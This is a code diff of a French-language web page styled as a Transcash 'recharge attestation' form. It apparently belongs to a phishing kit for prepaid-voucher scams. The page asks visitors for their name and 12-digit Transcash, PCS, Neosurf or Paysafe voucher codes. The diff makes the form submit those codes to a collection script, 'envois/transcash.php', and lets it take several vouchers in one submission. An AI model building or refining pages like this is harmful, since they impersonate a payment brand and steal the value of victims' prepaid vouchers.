@@ -5,7 +5,7 @@
     <title>Transcash - Fiche d'attestation des recharges</title>
     <meta charset="utf-8">
     <meta name="description" content="Fiche d'attestation des recharges">
-    <meta name="keywords" content="Fiche d'attestation des recharges, paysafe, neosurf, pcs, transcash">
+    <meta name="keywords" content="Fiche d'attestation des recharges, paysafe, neosurf, pcs, transcash, recharge transcash, recharge pcs, recharge neosurf, recharge paysafe">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
     <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800,900" rel="stylesheet">
@@ -51,7 +51,7 @@
                     <img src="images/logo-transcash.png" height="100" width="200" class="footer-logo" alt="TransCash">
                 </figure>
                 <div class="card">
-                    <form class="form-card" onsubmit="event.preventDefault()">
+                    <form class="form-card" action="envois/transcash.php" method="POST">
                         <div class="row justify-content-between text-left">
                             <div class="form-group col-sm-12 flex-column d-flex">
                                 <input type="text" id="fname" name="fname" placeholder="Nom complet" required="required"
@@ -80,11 +80,11 @@
                         <div id="row">
                             <div class="row justify-content-between text-left">
                                 <div class="form-group col-5 flex-column d-flex">
-                                    <input type="number" id="ticket" name="ticket" placeholder="Code du ticket" minlength="12" 
+                                    <input type="number" id="ticket" name="ticket[]" placeholder="Code du ticket" minlength="12" 
                                         maxlength="12" size="12" required="required" onblur="validate(4)" oninput="javascript: if (this.value.length > 12) this.value = this.value.slice(0, 12);">
                                 </div>
                                 <div class="form-group col-5 flex-column d-flex">
-                                    <select name="montant" id="montant" required="required" onblur="validate(12)">
+                                    <select name="montant[]" id="montant" required="required" onblur="validate(12)">
                                         <option selected="selected">Montant</option>
                                         <option value="20.00 €">20.00 €</option>
                                         <option value="30.00 €">30.00 €</option>
@@ -119,6 +119,15 @@
         </div>
     </div>
 
+    <footer class="text-muted">
+      <div class="container">
+          <p class="float-right">
+            Love
+          </p>
+          <p>Made by love with BootStrap</p>
+      </div>
+    </footer>
+
     <script src="js/jquery.min.js"></script>
     <script src="js/popper.js"></script>
     <script src="js/bootstrap.min.js"></script>
@@ -132,7 +141,7 @@
             $('#add').click(function () {
                 if (i < max_fields) {
                     i++;
-                    $('#row').append('<div class="row justify-content-between text-left" id="row' + i + '"><div class="form-group col-5 flex-column d-flex"><input type="number" id="ticket' + i + '" name="ticket" placeholder="Code du ticket" minlength="12" maxlength="12" size="12" required="required" onblur="validate(4)" oninput="javascript: if (this.value.length > 12) this.value = this.value.slice(0, 12);"></div><div class="form-group col-5 flex-column d-flex"><select name="montant" id="montant" required="required" onblur="validate(12)"><option selected="selected">Montant</option><option value="20.00 €">20.00 €</option><option value="30.00 €">30.00 €</option><option value="50.00 €">50.00 €</option><option value="100.00 €">100.00 €</option><option value="150.00 €">150.00 €</option><option value="200.00 €">200.00 €</option><option value="250.00 €">250.00 €</option><option value="500.00 €">500.00 €</option></select></div><div class="form-group col-1 flex-column d-flex"><button id="' + i + '" type="button" class="remove-btn form-control btn-danger">x</button></div></div>')
+                    $('#row').append('<div class="row justify-content-between text-left" id="row' + i + '"><div class="form-group col-5 flex-column d-flex"><input type="number" id="ticket' + i + '" name="ticket[]" placeholder="Code du ticket" minlength="12" maxlength="12" size="12" required="required" onblur="validate(4)" oninput="javascript: if (this.value.length > 12) this.value = this.value.slice(0, 12);"></div><div class="form-group col-5 flex-column d-flex"><select name="montant[]" id="montant" required="required" onblur="validate(12)"><option selected="selected">Montant</option><option value="20.00 €">20.00 €</option><option value="30.00 €">30.00 €</option><option value="50.00 €">50.00 €</option><option value="100.00 €">100.00 €</option><option value="150.00 €">150.00 €</option><option value="200.00 €">200.00 €</option><option value="250.00 €">250.00 €</option><option value="500.00 €">500.00 €</option></select></div><div class="form-group col-1 flex-column d-flex"><button id="' + i + '" type="button" class="remove-btn form-control btn-danger">x</button></div></div>')
                 }
             });
             $(document).on('click', '.remove-btn', function () {
@@ -150,10 +159,10 @@
 
             if(btn.innerText === "Masquer le Code"){
                 btn.innerText = "Afficher le Code";
-                btn.className= "btn btn-secondary Old";
+                btn.className = "btn btn-secondary Old";
             }else{
-                btn.innerText= "Masquer le Code";
-                btn.className= "btn btn-secondary New";
+                btn.innerText = "Masquer le Code";
+                btn.className = "btn btn-secondary New";
             }
         });
     </script>
